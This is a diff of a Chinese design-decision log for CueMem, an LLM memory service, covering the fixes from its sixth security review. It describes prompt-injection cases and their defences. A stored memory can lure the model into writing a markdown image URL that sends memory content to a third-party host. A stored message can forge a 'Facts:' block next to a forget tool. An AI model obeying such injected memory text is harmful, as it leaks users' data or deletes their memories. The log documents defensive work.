+    7. P20 与 D-068：`cuemem search-image` 的查询图片向量、回滚了的图片写入留下的缓存条目、Gradio 的临时副本最多约 2 小时，以及三个集成里的"召回 → 模型 → 写回"；
     8. P21：外部基线完整锁定的安装（工作流的第一次运行已在合并的 PR 上通过，第 7 组）；
     9. D-070 的第 1、3、6 条做完了，只剩 `tables.md` 摊销写入成本的一列（要 N9 的运行）与测试的子进程不受网络守卫；它的第 2、4、5、7、8 条不变。
   - **仍有的局限**：
@@ -1860,6 +1875,9 @@
   - **第 2 组（P10）**：`max_output_tokens`"压住或补上 `max_tokens` / `max_completion_tokens`"应为：两个都压住，并且总按模型的 `max_tokens_param` 写上上限，给 DeepSeek、通义的模型只发 `max_completion_tokens` 时也转发 `max_tokens`。
   - **第 3 组（P16）**：推迟也管重建（显式的 `consolidate(rebuild=True)`，或部署改了指纹之后的自动重建，以前会把留着的 run 半段抽取），`open_run` / `end_run` 去掉交接的记录，`end_run` 之后同名的 `add(run_id)` 又是普通的会话（以前 `add(wait=True)` 报 "still open"）。
   - **第 4 组（P14）**：`cuemem export -o` 替换已有的 0644 备份时，它变成 0600，现在是原子地替换。
+- **第六轮体检之后（D-073）**：
+  - **第 2 组（P7）**："`SameOriginOnly` 也管 `/login`（……不管 `/logout`）"：现在也管带着登录的令牌名字的 `/config` 与界面的首页 `/`。`/logout` 仍不按 `Origin` 查（`<img>` 与页面跳转不带 `Origin`），但带 `Sec-Fetch-Site: cross-site` 的 `/logout` 回 403。
+  - **第 2 组（P10）**：令牌还可以写 `max_concurrent`（默认 `CUEMEM_MAX_CONCURRENT_PER_KEY`，8：同时在处理的请求数）；运行中的 serve 与 proxy 会重新读入令牌文件，加、吊销、换一个限定作用域的令牌都不用重启（`cuemem keys`）。
 
 ## D-072 第五轮体检：合并到 main 之后从六个视角再查，核实为真的 22 处；评测请求、图片请求与发表的数字不变
 
@@ -1939,3 +1957,82 @@
     - 接手留下的会话、按会话分配序号、删除孤立的向量与 reindex，仍假定同一个数据库同时只有一个进程在写（同 D-068）；
     - 版本号的检查拦不住在它之前发布的 CueMem 打开更新的库；
     - 本地模式下建、删集合时进程被杀，`meta.json` 仍会被清空（能修，见上）。
+- **第六轮体检之后（D-073）**：
+  - **第 2 组（P4）**："下一次 `consolidate()` 或 `add(wait=True)` 把重建再做一遍"应为：下一次 `consolidate()`、`add(wait=True)` 或后台线程的巩固（serve、proxy、MCP、不带 `wait` 的 `add`、遗忘的重放）把它再做一遍。D-073 之前后台线程的巩固会用当前的指纹把标记盖掉。后台线程只看标记、不看 `stale()`，配置或流水线版本变了之后的重建仍要显式的 `consolidate()`；接着做的重建，清空与重新登记的事务一提交就删掉标记。
+  - **第 5 组（P8）**："`"2026"` 同时给出柏林与慕尼黑"只在换的日期是完整日期时成立：新值的开始、也就是旧值的结束是部分日期（`"2026"` 或 `"2026-06"`）时，查那一年或那个月会漏掉旧值。D-073 起这样的值算在它的结束指的那一年或那个月里成立，自己没有开始时间的更正版沿用被更正那一版的开始。留到以后的第 6 条说的是 `filters`，不变。
+  - **第 6 组（P19）**：客户端的说明 "(do not repeat a write blindly; check get_all/history)" 现在是 "(repeat it with the same idempotency_key, or check export)"，`add` 可以带幂等键。P19 限的是一次等待多久；D-073 又限了一个限定作用域的令牌同时在处理多少个请求，等待也不再占着服务器的线程。`/api/v1` 现在有 21 个接口（多了 `context`）。
+  - **留到以后的第 7、8 条**：令牌的管理（生成、吊销与令牌文件的热加载）与直接给提示词用的上下文接口由 D-073 做了；分页与 `/api/v1` 上的实体重新考虑之后仍否掉；幂等的批量导入仍去掉（单次的 `add` 现在可以带幂等键）。
+
+## D-073 第六轮体检：第五轮合并到 main 之后从六个视角再查，核实为真的 18 处；评测请求、图片请求与发表的数字不变
+
+- **状态**：已采纳（N12 之后）
+- **背景**：
+  - 第五轮（D-072）合并到了 main（9d1c2d2）。第六轮从六个视角查：第五轮新加的代码，也在 qdrant-client 1.20 下查；公网部署与不可信的存储内容的安全（威胁模型：谁连得到服务器，一个限定作用域的令牌、一条存下的记忆或者别的网站能让它做什么）；记忆的语义（用手写的对话从头到尾查双时间的事实模型）；依赖与 Python 的兼容（最新与最低的版本、Python 3.13 与 3.14、装着 Pillow 12 的 pip 安装、macOS 的 wheel）；文档与第一次运行（在新的克隆与新的 pip 安装里照 README 的命令与代码片段走一遍）；路线图上的功能（D-072 去掉的提议，对照 Mem0、Zep、Memobase、Graphiti、Cognee 与 LangMem 已经有的重新排）。规矩与 D-068 相同：只读代码，每个候选都离线复现（FakeAPI、ScriptedModel、TestClient，数据库与缓存用 `mode=ro` 打开的只读副本），量一量多常见、影响多大，并说明修法会不会改变评测的请求。
+  - 22 个候选去做对抗式核实：另一位审查者重跑复现、找反例、收窄说法，必要时重写修法（"改定的修法"）。留下 18 个（P1–P6、P8–P18、P22），否掉 4 个：P7（`/v1/embeddings` 不看令牌的 `models`：D-071 起就是有意的、写在文档里，`rate_per_minute` 也已经算它）、P19（`/api/v1` 上的实体与图：D-072 去掉了，限定作用域的令牌已经能用 `/api/spaces/{space}/graph`）、P20（对又说了一遍的事实按 metadata 过滤时，看的是合并之后的 metadata、后一句的值优先，较早那句的对话片段却照样匹配：这是文档写明的合并规则）与 P21（游标分页：问题是真的但小，1 万条事实 0.15 秒、5 万条 1.2 秒，而且遗忘的重放会改变事实的 ID，游标稳定不了）。另有 4 个提议在核实之前去掉：两个并进 P5 与 P13，变更流（`changes(since=)`）再次推后，`doctor --repair-vectors` 用受限的反序列化只防得住本来就能写数据目录的人。没有一个要主人决定；P11 与 P13 只改文档。
+  - 修复每条一个提交（P22 两个），用一个合并提交合在一起（`cuemem keys add` 与 `keys list` 也处理新的 `max_concurrent`，新的 `/api/v1` 接口按重新读入的文件认令牌）。合并之后整体复审，又找出 5 处，都修掉了，每处都有在修正之前失败的测试：接着做的重建把 `rebuild-pending` 又写了回去（P2）；`name_user` 没有测试管着（P10）；被丢下的 `POST /api/v1/wait` 一直占着令牌的并发名额（P3）；界面的首页 `/` 带着与 `/config` 相同的配置（P16）；令牌换了之后界面里的会话照样能用（P22）。下面按领域分组，写的是复审之后的状态。
+  - 不变量与 D-071 相同：默认配置与评测发出的 LLM、向量请求逐字节不变，缓存键不变，发给模型的图片字节也不变；冻结的方法（B1、B2、B4-nobm25 即 L1、B5 即 L2、B6，以及三个控制器文件）行为不变；每个行为修复都有在修复之前失败的回归测试；有意改变的缺省值都在各组里写明；新的能力都要显式打开。没有调用付费 API，没有跑评测。
+- **决策**：
+  1. **一条记忆、一个令牌卡不住服务器**（P1、P3；修订 D-056、D-068 第 4 组、D-071 第 2 组、D-072 第 6 组）：
+     - **线性地转义 `<memory`**（P1）：`evidence._TAG` 在证据块里转义 `<memory` 与 `</memory`（D-068），原来是 `<(\s*/?\s*memory)`：遇到 `<` 后面一长串空白却没有 `memory` 时，两个相邻的 `\s*` 回溯 O(n²)，匹配期间一直持有 GIL。一条 `<` 加 5 万个空格的记忆离线要 154 秒，每次被召回都卡住服务器的所有接口。现在用占有量词（`<(\s*+/?\s*+memory)`）；空白匹配不到 `/` 与 `m`，所以任何输入的匹配结果都相同，注入的证据块也逐字节相同。与 D-071 里持有 GIL 的 XBM 解码是同一类问题。
+     - **每个令牌同时处理的请求有上限**（P3）：`POST /api/v1/wait` 最多占着服务器 40 个线程中的一个 300 秒，一个限定作用域的令牌发约 40 个 wait（或任何慢的同步请求）就让每个租户的同步接口都卡住：一个令牌占着 45 个卡住的请求时，管理令牌的 `consolidate` 要 59.4 秒（有了上限之后不到 1 秒，45 个里 37 个以上回了 429）。现在配了令牌时，`BodyLimit` 按限定作用域的令牌数它在 `/api/`、`/api/v1`、`/v1` 与 `/mcp` 同时在处理的请求（任何方法，应用抛异常时也减回去），超过 `max_concurrent` 时回 429，带 `Retry-After: 1`（`/api/v1` 下 code 是 `rate_limited`；`/api` 下是中文的 `{"detail"}`；别处的说明是 `Too many concurrent requests for this access key: at most N at once (set with CUEMEM_MAX_CONCURRENT_PER_KEY or the key's max_concurrent); retry shortly.`）。上限是 `CUEMEM_MAX_CONCURRENT_PER_KEY`（正整数，默认 8；写错时 `cuemem serve` 与 `cuemem proxy` 以 1 退出），令牌文件里也可以给一个令牌写自己的 `max_concurrent`，写了时用它的。管理令牌、不鉴权的模式与界面不计数。每个令牌 8 个时，五个令牌加起来仍能占满 40 个线程；很多令牌共用一台服务器时，运营者应该调低它。
+     - **异步的 wait**（P3）：`POST /api/v1/wait` 改成 `async`：在事件循环里每 `WAIT_POLL_S` = 0.25 秒看一次后台线程，不占线程，所以最多在抽取做完之后 0.25 秒返回；作用域的检查、300 秒的上限与 504 都不变，OpenAPI 快照也不变。复审：这个循环看不出客户端已经走了，被丢下的 wait 要占着令牌的名额最多 300 秒（8 个就让这个令牌别的请求都回 429）；现在每次睡之前看一眼连接断了没有，断了 0.25 秒内结束。
+     - **缺省值的变化**：限定作用域的令牌已经有 8 个请求在处理时，下一个回 429。新增：`CUEMEM_MAX_CONCURRENT_PER_KEY`、令牌的字段 `max_concurrent`（以及 `Principal.max_concurrent`）、`cuemem.api.limits.concurrency_limit`、`MAX_CONCURRENT`、`BodyLimit.requests_in_flight`、`cuemem.api.memories.WAIT_POLL_S`。
+     - **评测**：评测不经过 serve 与记忆代理；证据块的字节不变。
+  2. **公网部署里的令牌、浏览器与记忆代理**（P22、P16、P4、P9；修订 D-047、D-056、D-062、D-069 第 6 组、D-071 第 2 组）：
+     - **管理令牌不用重启**（P22；D-072 去掉的"令牌的管理"）：`cuemem serve` 与 `cuemem proxy` 现在把令牌放在 `KeyRing`（`cuemem.api.auth`）里，它的读接口与 `Keys` 相同，每次调用交给当前的快照。设了 `CUEMEM_API_KEYS_FILE` 时，它最多每秒 stat 一次这个文件（`RELOAD_INTERVAL_S`，单调时钟），`(st_ino, st_mtime_ns, st_size)` 变了就重新解析、用一次赋值换上新的快照；原子地改名换上的文件即使修改时间与大小都相同也看得出来。下面这些时候不换，留着原来的令牌，日志里记一条只写令牌名字的警告：文件不在了、读不出或写错了；没设 `CUEMEM_API_TOKEN` 时新的文件一个令牌都没有（重新读入从不关掉鉴权）；文件里有短于 16 个字符的明文令牌、而启动时会拒绝它们。管理令牌与写在 `CUEMEM_API_KEYS` 里的令牌仍只在启动时读一次；没有令牌文件时从不 stat。限速的令牌桶按名字记，重新读入之后照旧。用重新读入时去掉了的令牌登录的界面会话什么都不能再用（`KeyRing` 记着去掉的名字，因为 `Keys.by_username` 会把不认识的名字当成用管理令牌登录的），而且（复审）同一个名字换了 sha256、或者吊销之后又加回来时，用这个名字登录的界面会话都退出（`KeyRing.on_rotate`，挂着界面时由 `create_app` 登记）；只改作用域或限额的不让人退出。换上新的快照时记一条 warning 级别的日志，写明新增与去掉的名字（serve 运行 uvicorn 的日志级别是 warning）。假定一个 uvicorn worker 进程，serve 与 proxy 都这样启动；不处理 SIGHUP。
+     - **`cuemem keys`**（P22）：`cuemem keys add NAME --user U… [--agent A…] [--rate-per-minute N] [--models M…] [--max-output-tokens N] [--max-concurrent N] [--file F]` 生成 `secrets.token_urlsafe(32)`，往 `--file` 或 `CUEMEM_API_KEYS_FILE`（数据目录的 `.env` 里设的也算）指的文件里加一项，写着带引号的 sha256 与一个作用域（`--user` 的值，给了 `--agent` 时连同它的值；只给 `--agent` 是这个 Agent 自己的记忆），文件不在时新建，令牌只打印这一次，单独一行、只打到标准输出（`TOKEN=$(cuemem keys add …)`），别的提示都在标准错误。`cuemem keys list` 列出名字、作用域与限额，从不显示令牌与摘要（写在 `CUEMEM_API_KEYS` 里的也能列）。`cuemem keys revoke NAME` 只删这一项的几行。两种修改都保留注释，核对别的令牌解析出来一个不变，原子地写回、权限 0600；令牌写在 `CUEMEM_API_KEYS` 里时拒绝。`keys: [...]` 那样流式写法的文件不动，改为打印要贴进去的那一项；`revoke` 删不干净的（`-` 单独一行、与别的内容写在同一行）拒绝，并写明是哪几行。吊销最后一个令牌时写成 `keys: []`，并提醒没有 `CUEMEM_API_TOKEN` 时运行中的服务仍认原来的令牌。
+     - **`/config` 与 `/` 只接受同源**（P16）：Gradio 的 `/config` 带着登录的令牌名字，HTTPS 下登录的 cookie 是 `SameSite=None`，Gradio 又回应带凭据的跨域请求，所以别的网站能读出访问者用的是哪个令牌。`SameOriginOnly` 现在也管 `/config`（按前缀）与（复审）界面的首页 `/`（正好是这个路径，带什么查询参数都算），它的 HTML 里有同样的配置：`Origin` 既不同源、也不在 `CUEMEM_ALLOWED_HOSTS` 里的请求回 403。在地址栏打开、点链接跳过来时浏览器不带 `Origin`，照常。`/logout` 没法按 `Origin` 防（`<img>` 与页面跳转不带它），所以带着 `Sec-Fetch-Site: cross-site` 的 `/logout`、`/logout/` 请求回 403；不带这个头的（旧浏览器、curl）与同源的登出照常，允许的主机里有 `*` 时不查。
+     - **不再不带鉴权地转发**（P4）：预设叠在默认配置上，所以 `--preset openai`、`deepseek` 或 `ollama` 下模型目录里仍有默认的别名（`qwen3.8-flash`、`deepseek-flash` 等）；请求这样一个供应商 Key 没设的模型时，记忆代理照样转发给那个供应商、不带 `Authorization` 头，用户的话与想起的记忆都发了出去，再被 401 拒绝（用 `qwen3.8-flash` 的 `examples/openai_proxy.py` 在 `--preset openai` 下就是这样失败的）。现在 `MemoryProxy._upstream` 在检索、开会话之前回 503（type `server_error`，param `model`，code `model_not_available`，`x-should-retry: false`），说明里写着请求的模型（不认识的名字改用的模型）、缺的环境变量与能用的模型。`GET /v1/models` 只列供应商有 Key（或不需要 Key）的别名与向量模型，`unknown_model: reject` 的 400 列的也是这些。限定作用域的令牌请求作用域之外的用户时仍先回 403。Key 都设了时转发的字节与请求头不变。示例改读 `CUEMEM_MODEL`（默认 `qwen3.8-flash`）。
+     - **演示界面不加载外站的图片**（P9）：界面把模型的回答（`gr.Chatbot`）与画像（`gr.Markdown`）按 Markdown 显示，一条记忆诱使模型写出 `![](https://第三方/?d=…)` 时，访问者的浏览器就把记忆内容发给了第三方。现在图片的写法（行内的与引用式的）按文字显示（引用编号渲染之后把 `![` 改成 `!\[`），画像按 HTML 转义。只影响显示：提示词与请求不变，图库里商品的图片不受影响，回答里本来就有的 Markdown 图片现在也显示成文字。
+     - **缺省值的变化**：运行中的 serve 与 proxy 重新读入令牌文件；去掉了或换了的令牌在界面里的会话结束；带 `Origin` 的跨站请求 `/config` 与 `/` 回 403，带 `Sec-Fetch-Site: cross-site` 的 `/logout` 回 403；记忆代理对没有 Key 的目录模型回 503 `model_not_available`，`/v1/models` 不再列它们；界面把 Markdown 图片显示成文字。新增：`cuemem keys add|list|revoke`、`KeyRing`（`from_env`、`current`、`on_rotate`）与 `AnyKeys = Keys | KeyRing`、`auth.key_entry`、`append_key`、`key_lines` 与 `remove_key`、`RELOAD_INTERVAL_S`。没有新的环境变量与接口。
+     - **评测**：评测不经过这些入口，记忆代理也不在冻结的路径上。
+  3. **记忆的含义**（P2、P6、P5、P10；修订 D-019、D-020、D-068 第 5 组、D-072 第 2、5 组）：
+     - **中断的重建由后台线程做完**（P2）：D-072 的 `rebuild-pending` 标记让下一次 `consolidate()` 或 `add(wait=True)` 重做中断的清空重建，但后台线程的一次巩固（serve、proxy、MCP、不带 `wait` 的 `add`、遗忘的重放）用当前的指纹把标记盖掉了，事实就一直没有向量。现在 `Consolidator.run` 在这个空间的锁里先看标记，在的话记下 `consolidate_resume_rebuild`、先做清空重建：每个会话都重新登记，`infer=False` 只写了日志的也在内，与 `consolidate(rebuild=True)` 说的相同。它只看标记、不看 `stale()`，配置或流水线版本变了时仍要显式的 `consolidate()`。代价是后台线程上一次完整的重建：`llm_cache_mode: read_write` 时由 LLM 缓存给出，否则与显式重建发同样的请求。复审：接着做的重建把 `rebuild-pending` 当成要还原的指纹又写了回去，之后的重放中进程被杀又会从头重建，中断之后的 `consolidate()` 要重建两遍；现在接着做的重建的清空与重新登记一提交就删掉标记，剩下的工作在重新登记的任务里，巩固做完时写下新的指纹。
+     - **对账按说出的先后**（P6）：同一个会话里，新事实按抽取模型列出的顺序对账，所以发言带着不同时间的会话（SDK 的 `run()`、LangGraph 的线程、记忆代理按名字的会话、界面的对话）里，先说的可能取代后说的。现在 `Consolidator._apply` 在对账之前按每条事实来源发言里最晚的完整时间稳定排序（没有时用会话开始的时间）。事实的 ID 在这之前就定了，不变；`PIPELINE_VERSION` 不变。这样的空间下一次重放（遗忘或重建）时派生的事实可能不同，灰区的对账请求换了缓存键：每个受影响的会话约多一次 LLM 调用。评测的会话都只有一个时间（414 个评测库的 19,472 个会话里是 0 个），评测的请求不变。已知的局限：一次多条消息的 `add()` 抽出的事实时间相同，仍按抽取的顺序；按发言的序号再排会改变评测的会话。
+     - **`valid_at` 的时间段补全**（P5）：D-072 让年与月成了一段时间，但值的结束（取代它的那个值的开始）本身是部分日期（`"2026"` 或 `"2026-06"`）时，查那一年或那个月会漏掉它；查更正之前的日期两个版本都不给（`add()` 之后 `update()`，查 add 那天什么都没有）。`MemoryDB.get_facts` 现在（a）结束是部分日期的值，算在那个日期指的那一年或那个月里成立，所以 `"2026"` 同时给出柏林（到 `"2026"`）与慕尼黑（从 `"2026"`），`"2027"` 只给慕尼黑；（b）更正了的值自己没有开始时间时，沿用被更正那一版的开始，沿更正链递归（用递归的 CTE；更正了几版时取最早的），因为更正说的是旧的值从来不成立。显式的开始时间总是优先，`changed` 的取代不沿用。单独一天的查询，结束一侧的逻辑与以前相同。只改读的一侧：存下的事实、对账、检索与请求都不变。3 万条事实、1 万条更正链接时，在内存里查一年 0.39 秒、查一天 0.11 秒。
+     - **带重音与全角的字符不再合并**（P10；修订 D-068 第 5 组）：原来的键（`normalize_value`、`normalize_name`）仍会删掉带重音的拉丁字母与全角的数字、字母：`Müller` 与 `Möller` 都成了 `m ller`，`８０００円` 与 `６０００円` 都成了 `円`。不同的值被当成重复合并（预算的改动悄悄丢了），不同的人成了同一个实体。现在原来的键相同时再比一个键 `strict_key`（`cuemem.write.predicates`）：NFKC、casefold、NFKD 之后去掉组合符号，连续的非单词字符合成一个空格，去掉开头的冠词（只有 ASCII 与汉字的文字仍用原来的键）。它折叠重音而不是保留，所以 `Café` / `Cafe` / `cafè` 与 `Zoë` / `Zoé` 的比较结果与以前相同，`Müller` / `Möller` 与 `８０００` / `６０００` 则不同。对账按两个键比较宾语（每个键各自相等或包含，从不拼在一起）；找实体时原来的键找到的只在 `strict_key` 也与实体的名字或某个别名相同时才算，同一会话里的提及与 `name_user` 也用两个键。与已有 ID 撞上时给新的 ID：实体是 `stable_id(space, 'entity', strict_key, type, 'u')`，同一会话里的第二句是 `stable_id(space, 'fact', session, strict_key, 's')`；合并了的拼写变体记成别名。已有的键、事实 ID 与实体 ID 都不变。实测：414 个评测库（94,916 条事实、63,001 个实体）与缓存里全部 5,171 次抽取（27,169 条抽出的事实）里受影响的都是 0 对；6 个评测空间从缓存离线重建，改之前与之后的事实、实体与 LLM 缓存键逐位相同。
+     - **缺省值的变化**：中断的重建由下一次后台巩固做完（会发它的 LLM 请求）；同一会话里按说出的先后对账；`valid_at` 的年与月包括在其中结束的值，更正从被更正那一版的开始算起；只差重音或全角的值与名字分开。新增：trace 事件 `consolidate_resume_rebuild`、`strict_key`、`name_keys`、`EntityState.strict_index` 与 `named()`。没有新的参数与环境变量；`PIPELINE_VERSION` 不变。
+     - **评测**：评测空间里没有中断的重建、没有带几个时间的会话、也没有严格键分得开的一对（上面量过）；`get_facts(valid_period=)` 不在评测的路径上。默认的巩固指纹仍是 `2f0adc7890b6a52e`。
+  4. **给应用的两个可选调用**（P17、P18；修订 D-061、D-069（备选与取舍）、D-072 第 6 组）：
+     - **直接放进提示词的上下文**（P17；D-072 去掉的"直接给提示词用的上下文接口"）：`Memory`、`AsyncMemory`、`MemoryClient` 与 `AsyncMemoryClient` 上的 `context(query, *, user_id=None, agent_id=None, at=None, mode="auto", router="learned", lam=None, min_level="l1", wrap=True)`，以及 `POST /api/v1/context`（operationId `context`），返回 `{context, level, reasons, recalled, see, refs}`：记忆代理注入的那段证据块（画像、带日期与有效状态的事实、按时间排列的对话片段，`<memory` 已转义，开头是 `MEMORY_NOTE`），不调用模型。`wrap=True` 时包在 `<memory>\n…\n</memory>` 里；没有要给的内容时 `context` 是空串；`recalled` 是条数（画像算一条）；`refs` 是块里每个编号（`[f1]`、`[m1]`……）对应的、`get()` 认得的记忆 ID。与 `search` 相同，缺省的 `min_level="l1"` 把控制器选的 L0 抬到 L1；`min_level="l0"` 照控制器的决定，与记忆代理逐字节相同。过期的记忆不给，画像里也去掉。空的空间返回 `""`，reasons 是 `["no memories yet"]`。HTTP 上：作用域之外 403，没有 `user_id` 也没有 `agent_id` 时 400，`mode`、`router`、`min_level` 或 `lam` 写错时 422。以前应用拿 `search()` 的结果拼提示词，没有有效状态与日期的排法，也不转义 `</memory>`。内部新增 `evidence.context_evidence`，`Evidence` 多了 `refs`；`recall_evidence`、`inject_evidence`、记忆代理与各集成不变（有测试钉住记忆代理注入的文字的 sha256）。缺省用 `l1`，因为体检者的 `l0` 在 README 的例子上给出空的上下文。
+     - **幂等的 add**（P18；修订 D-069 否掉的备选"在线写入用幂等键"）：D-072 的客户端代码 `timeout` 与 `disconnected` 说写入可能已经存下了，可调用方没有办法安全地重发，`get_all` 也看不到排着队的 add。四个类的 `add(..., idempotency_key=None)`，以及 `POST /api/v1/memories` 的 `Idempotency-Key` 头，接受 1–255 个可打印 ASCII 字符的键（否则 ValueError，HTTP 400）。24 小时内（`ADD_KEY_TTL`），同一个用户（空间）下同一个键、同一个请求只写一次：重发返回 status `duplicate`、原来的 `session_id` 与 `turn_ids`、`results: []` 与 `replayed: true`，`wait=True` 也不抽取。那次写下的发言被遗忘了时（`delete`、`delete_all(run_id=)`、遗忘），这个键成了墓碑，重发返回 status `forgotten`（`session_id` 为 null，`turn_ids` 为 []），什么都不写。同一个键用于不同的请求（`messages`、`user_id`、`agent_id`、`run_id`、`metadata`、`expiration_date`、`timestamp` 或 `infer` 不同；`wait` 不比）时抛新的 `IdempotencyConflictError`（HTTP 409，code `conflict`）。库里只存键的 sha256，放在新表 `add_keys` 里，用 `CREATE TABLE IF NOT EXISTS` 建（`SCHEMA_VERSION` 仍是 7；旧的 v7 代码不管它，但它的 `delete_space` 不会删这张表的行）；这一行与发言写在同一个事务里，并发地插入同一个键时再查一次。`delete_all()` 删整个用户与 `reset()` 连同别的一起删掉这个用户的记录，所以之后到的重发是一次新的写入（不留残余的规则优先）。不给键时 `add` 不多一次查询，请求不变。`MemoryClient` 超时与断开的说明现在以 "(repeat it with the same idempotency_key, or check export)" 结尾。已知的缺口：带键的 add 提交之后遇到 ConcurrentWriteError（同一个 `run_id` 里同时进行的写入拿走了同样的序号）时，那一行记着的发言 ID 并没有全部写下。客户端用生成的键自动重试没有做。
+     - **缺省值的变化**：不用新参数时没有；客户端超时与断开的说明变了。新增：四个类上的 `context`、`POST /api/v1/context`、`ContextRequest`、`ContextResult`、`idempotency_key`、`Idempotency-Key` 头、`AddResult.status` 的 `duplicate` 与 `forgotten`、`AddResult.replayed`、`cuemem.errors.IdempotencyConflictError`、表 `add_keys`、`MemoryDB.add_key_lookup`、`add_key_insert` 与 `add_key_forget`。`/api/v1` 有 21 个接口；`docs/openapi-v1.json` 已重新生成。
+     - **评测**：评测不用这两个调用。
+  5. **给别的 Agent 的召回清单**（P8、P13；修订 D-066、D-068 第 4 组）：
+     - **清单里引用的文字逐行标出**（P8）：召回清单（`format_listing`）给 MCP 的 recall 工具（stdio 与 `/mcp`）以及 LangGraph、OpenAI Agents 的 recall 工具用，存下的对话片段与画像从第 0 列开始打印，所以一条存下的消息能伪造一个带着真实 ID 的 `Facts:` 段落，就在 `forget(ids)` 工具旁边。现在对话片段与画像的每一行都以 `| ` 开头，多行的事实陈述用 ` / ` 连成一行，每份清单都以一个空行加 `End of recalled memories.` 结尾，`LISTING_NOTE` 多一句 "Quoted text is marked with '| '."。合并换行不用正则（`\s*[\r\n]+\s*` 本身是 O(n²)，2 万个空格要 2.3 秒）。这有意改变工具返回的文字，按请求缓存的集成请求会失效一次；`/recall`、`/api/v1` search 的 JSON、记忆代理的 `<memory>` 块与每个评测请求都不变。它减少提示词注入，不能杜绝。
+     - **Claude 服务端保存的线程**（P13，只改文档）：anthropic 2.3（锁定的版本）的 `tool_runner` 默认把对话放在服务端保存的线程里，证据块也在内；这一份在 CueMem 的 `forget` 与 `delete_all` 之外。框架集成的文档现在写明这一点，并给出 `thread=False`（anthropic 2.3 起才有这个参数），用在遗忘要覆盖发出去的内容的部署里。项目的 `anthropic>=1.14` 下限与示例代码不变。
+     - **评测**：评测不用这些清单与集成。
+  6. **安装、CI 与文档**（P12、P14、P15、P11；修订 D-060、D-071 第 1、5 组、D-072 第 3 组）：
+     - **兼容性工作流**（P12）：`.github/workflows/compat.yml`（"兼容性"，任务 `compat`，不是必需的检查，也不在 `.github/rulesets/protect-main.json` 里）每周跑一次（周四 05:23 UTC），可以手动触发，改了 `pyproject.toml`、`uv.lock` 或它自己的拉取请求也跑，分三格：`newest-3.12` 与 `floors-3.12` 用 `uv pip install --no-config --resolution highest` 或 `lowest-direct` 安装（`[tool.uv]` 的覆盖不生效，与 pip 用户一样装上 Pillow 12，图片的金标也核对）并写明 `pytest>=9.1.1`（lowest-direct 下不写时解到 pytest 2.0.0），`locked-3.14` 在 Python 3.14 上按锁文件跑。setup-uv 用 `enable-cache: false`。wheel 多了 Python 3、3.12、3.13 与 3.14 的分类，README 写"Python 3.12 或更新的版本"（锁文件、镜像与发表的结果用 3.12），不承诺 CI 覆盖 3.14。
+     - **Intel Mac**（P14）：onnxruntime 1.24 起没有 Intel macOS 的 wheel，也没有源码包，所以 Intel Mac 上 `uv sync --extra local` 解不出来。`[tool.uv] constraint-dependencies` 加上 `onnxruntime<1.24; sys_platform == 'darwin' and platform_machine == 'x86_64' and python_version < '3.14'`，用 uv 0.12.24 重新锁定（不是 `--upgrade`）；只有 Intel darwin 那一支变了（onnxruntime 1.23.2，加上 coloredlogs、humanfriendly、mpmath 与 sympy），Linux、Docker、CI 与 Windows 装的包相同（全部可选依赖的预演列出同样的 138 个包）。CI 的 test 任务多一步只解析不安装的检查（`uv sync --locked --dry-run --no-install-project --extra local --python 3.12 --python-platform x86_64-apple-darwin`）。cryptography 不压到 49 以下（48.x 有安全公告），所以 Intel Mac 上 `uv sync` 要从源码构建它、需要 Rust；Apple Silicon 上的 `local` 要 macOS 14（标记分不出 macOS 13 与 14，所以不加 `required-environments`）。
+     - **文档与命令行对得上**（P15、P11）：`--preset` 的帮助（以及命令行与配置模块的说明）列出全部四个预设；README 的 `ui` 一行写上 `/mcp`；换预设的例子用自己的 `CUEMEM_HOME`（数据目录记着它的向量模型，`./data` 上 `--preset ollama ingest` 会失败）；早先记录里的 `cuemem search-image` 改成 `cuemem search-image`；README 写上 `X-CueMem-Level` 还有 `none` 与 `error`。备份的做法（P11）加上 `claude_memory.sqlite` 与它的 `-wal`、`-shm`（Claude memory tool 的 `/memories` 文件，不在 `cuemem export` 里，也不能从日志重建），恢复时也删它残留的 WAL 文件。
+     - **评测**：只改了 CI、元数据与文档；锁文件只对 Intel Mac 变了，发表的数字在 Linux 上重放。
+- **备选与取舍**：
+  - **给正则的空白设个长度上限**（P1）：长的空白串转义的结果会变；占有量词让每个匹配都不变。
+  - **全局的线程预算，或给 `/api/v1/wait` 单独的线程池**（P3）：按令牌的上限也管住别的慢接口，异步的 wait 根本不要线程池。**经 `create_app` 传上限**：改为从环境变量读，单独运行的记忆代理也拿得到。
+  - **`/logout` 只写进文档**（P16 的 a）：`Sec-Fetch-Site` 在现在的浏览器里拦住跨站的登出，对别人没有代价。
+  - **SIGHUP 或 inotify**（P22）：在请求的路径上每秒 stat 一次两者都不用，容器里、每个平台上都能用，代价是每秒一次 `stat`。
+  - **没有 Key 也照样转发，或者干脆拒绝启动**（P4）：前者把消息与记忆泄露给一个认证不了它们的供应商；后者让预设用不了，而预设自己的模型是好的。
+  - **时间相同的按发言序号再排**（P6）会改变评测的会话；**升 `PIPELINE_VERSION`** 会为只影响带几个时间的会话的改动重建每个空间。
+  - **用 Python 沿更正链走**（P5）：递归的 CTE 保留 `session_ids` 的分批，只要一次查询。
+  - **用严格键代替原来的键**（P10）：会改变事实与实体的 ID 以及评测的键；只在原来的键相同时再比严格键，原来分开的一个都不变。
+  - **在客户端从 `search()` 拼出上下文**（P17）：每种语言都要重写一遍证据的排法与转义。
+  - **`delete_all` 与 `reset` 之后留着幂等的记录**（P18）：那是被删的用户留下的残余，D-070 的残余扫描不允许。
+  - **把 anthropic 的下限升到 2.3、示例里传 `thread=False`**（P13）：留给改代码的时候；文档写明哪些版本有这个参数。
+  - **把 cryptography 压到 49 以下**（P14）：48.x 有安全公告。
+- **后果**：
+  - 代码与测试：改了 40 个文件（不计文字的文档，含 `docs/openapi-v1.json` 与 `uv.lock`），新增 61 个测试函数；共收集 1,425 个测试，去掉 6 个联网的，离线跑 1,419 个，其中 23 个在没装外部基线的包（18 个）或没有 Qdrant 服务端（5 个）时跳过、改由 CI 跑；ruff、mypy 通过。每个行为修复都核对过在修复之前的代码上失败。
